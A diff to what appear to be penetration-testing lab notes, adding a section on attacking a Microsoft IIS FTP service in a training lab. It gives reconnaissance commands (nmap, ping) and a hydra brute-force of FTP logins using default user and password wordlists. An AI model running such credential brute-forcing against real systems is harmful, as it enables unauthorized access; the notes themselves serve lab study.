@@ -1665,9 +1665,16 @@ use /auxiliary/scanner/smb/smb_version
 set RHOSTS 10.0.22.85
 run
 ```
+85) Targeting Microsoft IIS FTP
 
-
-
+```
+cat /etc/hosts
+ping demo.ine.local
+nmap -sV -sC -p21,80 10.0.28.97
+ftp 10.0.28.97 21
+hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.0.28.97 ftp
+ftp 10.0.28.97 21 # give the username and password
+```
 
 
 
